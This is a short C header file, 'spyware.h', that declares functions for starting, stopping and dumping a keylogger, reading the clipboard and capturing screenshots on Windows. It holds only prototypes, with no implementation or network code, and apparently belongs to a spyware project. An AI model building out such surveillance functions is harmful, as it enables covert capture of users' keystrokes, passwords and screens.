#ifndef SPYWARE_H
#define SPYWARE_H

#include <stdio.h>

#ifdef _WIN32
#include <windows.h>
#endif

/* Keylogger functions */
void  spy_keylog_start(void);
void  spy_keylog_stop(void);
char *spy_keylog_dump(int *len_out);

/* Clipboard functions */
char *spy_clipboard_get(int *len_out);

/* Screenshot functions */
char *spy_screenshot_capture(int *len_out);

#endif /* SPYWARE_H */
